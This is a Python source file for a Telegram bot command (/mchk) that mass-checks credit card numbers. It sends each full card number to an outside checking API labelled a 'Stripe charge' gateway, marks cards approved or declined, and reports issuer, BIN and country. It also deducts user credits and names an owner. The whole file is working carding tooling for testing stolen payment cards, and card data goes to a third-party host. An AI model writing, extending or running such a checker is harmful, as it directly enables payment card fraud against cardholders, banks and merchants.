import json
import time
import threading
import asyncio
import httpx
import re
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getcc_for_mass import *
from TOOLS.getbin import *

async def chkr_mass_mchkfunc(fullcc, user_id):
    retries = 3
    for attempt in range(retries):
        try:
            async with httpx.AsyncClient(timeout=30, follow_redirects=True) as session:
                url = f"https://chkr-api.vercel.app/api/check?cc={fullcc}"
                resp = await session.get(url)
                resp_json = resp.json()
                status_raw = resp_json.get("status", "Unknown")
                message = resp_json.get("message", "").replace(" [GATE_01@chkr.cc]", "").strip()
                if status_raw.lower() == "live":
                    status = "Approved ✅"
                else:
                    status = "Declined ❌"

                card_info = resp_json.get("card", {})
                card_num = card_info.get("card", fullcc)
                bank = card_info.get("bank", "Unknown")
                type_ = card_info.get("type", "Unknown")
                category = card_info.get("category", "Unknown")
                brand = card_info.get("brand", "Unknown")
                country = card_info.get("country", {})
                country_name = country.get("name", "Unknown")
                flag = country.get("emoji", "")
                country_code = country.get("code", "")
                currency = country.get("currency", "Unknown")

                formatted_msg = f"""{status}
━━━━━━━━━━━━━
[⟐] 𝗖𝗖 - <code>{card_num}</code>
[⟐] 𝗦𝘁𝗮𝘁𝘂𝘀 : {message}
[⟐] 𝗕𝗮𝗻𝗸 : {bank}
[⟐] 𝗧𝘆𝗽𝗲 : {type_} | {category} - {brand}
[⟐] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country_name} {flag} ({country_code})
[⟐] 𝗖𝘂𝗿𝗿𝗲𝗻𝗰𝘆 : {currency}
"""
                return formatted_msg

        except Exception:
            import traceback
            await error_log(traceback.format_exc())
            if attempt < retries - 1:
                await asyncio.sleep(0.5)
                continue
            else:
                return f"<code>{fullcc}</code>\n<b>Result - DECLINED ❌</b>\n"

@Client.on_message(filters.command("mchk", [".", "/"]))
def multi(Client, message):
    t1 = threading.Thread(target=bcall, args=(Client, message))
    t1.start()

def bcall(Client, message):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(chkr_mass_auth_cmd(Client, message))
    loop.close()

async def chkr_mass_auth_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = str(message.from_user.first_name)
        checkall = await check_all_thing(Client, message)
        if not checkall[0]:
            return

        role = checkall[1]
        getcc = await getcc_for_mass(message, role)
        if not getcc[0]:
            await message.reply_text(getcc[1], message.id)
            return

        ccs = getcc[1]
        resp = f"""
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  STRIPE API CHARGE

- 𝐂𝐂 𝐀𝐦𝐨𝐮𝐧𝐭 - {len(ccs)}
- 𝐂𝐡𝐞𝐜𝐤𝗲𝗱 - Checking CC For {first_name}

- 𝐒𝐭𝐚𝐭𝐮𝘀 - Processing...⌛️
        """
        nov = await message.reply_text(resp, message.id)

        text = f"""
<b>↯ STRIPE CHARGE API Gateway [/mchk]</b>\n
Number Of CC Check : [{len(ccs)}]
"""
        amt = 0
        start = time.perf_counter()
        worker_num = int(json.loads(open("FILES/config.json", "r", encoding="utf-8").read())["THREADS"])
        works = [chkr_mass_mchkfunc(i, user_id) for i in ccs]

        while works:
            batch = works[:worker_num]
            results = await asyncio.gather(*batch)

            for result_text in results:
                fullcc = ccs[amt]
                amt += 1

                getbin = await get_bin_details(fullcc)
                brand = getbin[0] if len(getbin) > 0 else "Unknown"
                type_ = getbin[1] if len(getbin) > 1 else "Unknown"
                level = getbin[2] if len(getbin) > 2 else "Unknown"
                bank = getbin[3] if len(getbin) > 3 else "Unknown"
                country = getbin[4] if len(getbin) > 4 else "Unknown"
                flag = getbin[5] if len(getbin) > 5 else ""
                currency = getbin[6] if len(getbin) > 6 else "Unknown"

                proxy_status = "Live ✨"
                gateway = "STRIPE CHARGE"
                bin6 = fullcc[:6]

                status_match = re.match(r"(Approved ✅|Declined ❌)", result_text)
                response_match = re.search(r"\[⟐\]\s+𝗦𝘁𝗮𝘁𝘂𝘀\s*:\s*(.+)", result_text)

                if status_match:
                    status_text = status_match.group(1)
                else:
                    status_text = "Declined ❌"  # Remove UNKNOWN by assigning Declined by default

                response_text = response_match.group(1).strip() if response_match else "No message"

                finalresp = f"""
{status_text}
━━━━━━━━━━━━━
[⟐] 𝗖𝗖 - <code>{fullcc}</code>
[⟐] 𝗦𝘁𝗮𝘁𝘂𝘀 : {response_text}
[⟐] 𝗚𝗮𝘁𝗲  - {gateway}
━━━━━━━━━━━━━
[⟐] B𝗶𝗻 : {bin6}
[⟐] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country} {flag}
[⟐] 𝗜𝘀𝘀𝘂𝗲𝗿 : {bank}
[⟐] 𝗧𝘆𝗽𝗲 : {brand} | {type_} - {level}
"""
                text += finalresp
                try:
                    await Client.edit_message_text(message.chat.id, nov.id, text)
                except Exception:
                    pass

            works = works[worker_num:]
            await asyncio.sleep(0.5)

        text += f"""
━━━━━━━━━━━━━
[⟐] T/t : {time.perf_counter() - start:0.2f}s | Proxy : {proxy_status}
[⟐] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆: <a href='tg://user?id={message.from_user.id}'> {first_name}</a> [ {role} ]
[⟐] 𝗢𝘄𝗻𝗲𝗿: <a href="tg://user?id=8340881349">𝑺𝑷𝑰𝑫𝑬𝑹</a>
╚═════⟐「 𝐂𝐇𝐀𝐑𝐆𝐄 𝐌𝐀𝐒𝐓𝐄𝐑  」⟐═════╝
"""
        await Client.edit_message_text(message.chat.id, nov.id, text)
        await massdeductcredit(user_id, len(ccs))
        await setantispamtime(user_id)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())
